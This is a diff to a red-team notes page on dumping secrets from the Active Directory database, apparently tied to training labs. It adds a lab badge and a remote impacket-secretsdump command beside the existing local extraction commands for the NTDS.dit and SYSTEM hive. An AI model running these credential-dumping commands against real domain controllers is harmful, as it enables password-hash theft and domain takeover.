@@ -145,6 +145,7 @@ You can use [BloodHound](/cybersecurity/red-team/tools/utilities/windows/bloodho
 #### Dump Secrets From Active Directory database
 
 [![windows_privilege_escalation](../../../../cybersecurity/_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
+[![attacktivedirectory](../../../../cybersecurity/_badges/thm-p/attacktivedirectory.svg)](https://tryhackme.com/r/room/attacktivedirectory)
 [![windows_ntds_secret_extraction](../../../../cybersecurity/_badges/rootme/forensic/windows_ntds_secret_extraction.svg)](https://www.root-me.org/en/Challenges/Forensic/Windows-NTDS-Secret-extraction)
 
 The active directory, similarly to the SAM database, is partially encrypted using a [bootkey](/operating-systems/windows/security/index.md#syskey-bootkey-and-system-hive) stored in the SYSTEM registry.
@@ -160,6 +161,12 @@ You can use impacket [secretsdump](/operating-systems/networking/protocols/tools
 ```shell!
 $ impacket-secretsdump -system ./system.hive -ntds ./ntds.dit LOCAL -outputfile cracked
 $ grep "krbtgt" cracked.ntds.kerberos # kerberos tickets
+```
+
+You could also do it remotely:
+
+```shell!
+$ impacket-secretsdump -dc-ip IP -just-dc sdomain/username:password@IP
 ```
 
 You could also use [DSInternals](https://github.com/MichaelGrafnetter/DSInternals/) <small>(1.5k ⭐)</small>:
